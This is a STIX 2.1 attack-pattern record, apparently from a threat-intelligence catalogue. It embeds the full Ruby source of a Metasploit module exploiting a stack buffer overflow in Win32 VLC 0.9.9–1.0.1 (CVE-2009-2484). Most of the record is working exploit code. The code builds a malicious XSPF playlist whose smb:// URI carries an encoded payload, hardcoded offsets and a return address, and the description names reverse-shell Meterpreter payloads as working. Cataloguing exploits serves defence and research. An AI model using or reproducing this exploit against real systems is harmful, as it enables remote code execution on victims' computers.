{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bdde55d9-80ff-4718-8ffb-5015282a7e3c",
    "created": "2024-08-14T16:37:19.232866Z",
    "modified": "2024-08-14T16:37:19.23287Z",
    "name": "VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in the Win32AddConnection function of the VideoLAN VLC media player. Versions 0.9.9 through 1.0.1 are reportedly affected.  This vulnerability is only present in Win32 builds of VLC.  This payload was found to work with the windows/exec and windows/meterpreter/reverse_tcp payloads. However, the windows/meterpreter/reverse_ord_tcp was found not to work.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/vlc_smb_uri.rb",
            "external_id": "vlc_smb_uri.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2484"
        },
        {
            "source_name": "reference",
            "url": "http://git.videolan.org/?p=vlc.git;a=commit;h=e60a9038b13b5eb805a76755efc5c6d5e080180f"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in the Win32AddConnection\n        function of the VideoLAN VLC media player. Versions 0.9.9 through 1.0.1 are\n        reportedly affected.\n\n        This vulnerability is only present in Win32 builds of VLC.\n\n        This payload was found to work with the windows/exec and\n        windows/meterpreter/reverse_tcp payloads. However, the\n        windows/meterpreter/reverse_ord_tcp was found not to work.\n      },\n      'License'        => MSF_LICENSE,\n      'Author' \t     => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'BID', '35500' ],\n          [ 'OSVDB', '55509' ],\n          [ 'CVE', '2009-2484' ],\n          [ 'URL', 'http://git.videolan.org/?p=vlc.git;a=commit;h=e60a9038b13b5eb805a76755efc5c6d5e080180f' ],\n          [ 'EDB', '9029' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'DisableNops'    => true,\n          'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ESI',\n            }\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'vlc 0.9.9 on Windows XP SP3',\n            # shellcode pointers @ esp + {0xa4,0xd0,0xdc,0xec,0x1ec}\n            {\n              'Readable' => 0x65414141, # points to nul bytes in libmod_plugin\n              'Offset'   => 409,\n              # libvout_directx_plugin.dll\n              # add esp,0xcc / pop ebx / pop esi / pop edi / pop ebp / ret\n              # esi is used as our buffer register, and also becomes eip\n              # (there are two copies of the pointer on the stack)\n              'Ret'      => 0x6b54543e,\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-06-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.xspf']),\n      ])\n  end\n\n  def exploit\n\n    template = %Q|<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<playlist version=\"1\" xmlns=\"http://xspf.org/ns/0/\" xmlns:vlc=\"http://www.videolan.org/vlc/playlist/ns/0/\">\n<title>Playlist</title>\n<trackList>\n<track>\n<location>REPLACE_ME</location>\n<extension application=\"http://www.videolan.org/vlc/playlist/0\">\n<vlc:id>0</vlc:id>\n</extension>\n</track>\n</trackList>\n</playlist>\n|\n\n    readable = [target['Readable']].pack('V')\n\n    # we'll model the memory layout post-overflow..\n    #psz_remote = Rex::Text.pattern_create(2+260+1+260)\n    psz_remote = rand_text_alphanumeric(target['Offset'] + 4)\n    psz_remote[0,2] = \"\\\\\\\\\"\n    psz_remote[2+260,1] = \"\\\\\"\n\n    # some of this causes crashes in \"WNetAddConnection2A\" so we need to use\n    # readable addresses... dodging the crashy derefs!\n    # NOTE: some of these only occur in odd open scenarios (like drag/drop)\n    psz_remote[263,4] = readable\n    psz_remote[271,4] = readable\n    psz_remote[325,4] = readable\n    psz_remote[337,4] = readable\n\n    # add the return addr in\n    psz_remote[target['Offset'],4] = [target.ret].pack('V')\n\n    # now we can split it and put it in the xml...\n    host,share = psz_remote[2,psz_remote.length].split(\"\\\\\")\n    path = \"smb://%s@%s/%s/\" % [payload.encoded, host, share]\n    sploit = template.gsub(/REPLACE_ME/, path)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-06-24",
    "x_mitre_platforms": [
        "win'"
    ]
}